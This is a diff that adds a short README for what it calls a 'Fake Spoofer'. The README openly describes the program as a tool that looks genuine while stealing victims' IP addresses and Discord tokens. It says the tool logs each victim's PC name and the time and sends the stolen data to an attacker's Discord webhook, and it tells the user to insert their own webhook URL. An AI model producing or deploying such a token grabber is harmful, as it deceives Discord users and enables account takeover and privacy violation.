@@ -1,0 +1,5 @@
+This is a Fake Spoofer,
+it looks really real and grabbs your IP-Adress and Discord Token.
+It also has a Log system,where i tells if someone got grabbed and the name of his PC AND the Time.
+The rest gets sent to another webhook,or if you want to put the same webhook URL everywhere.
+Replace the "WEBHOOK" with your webhook.
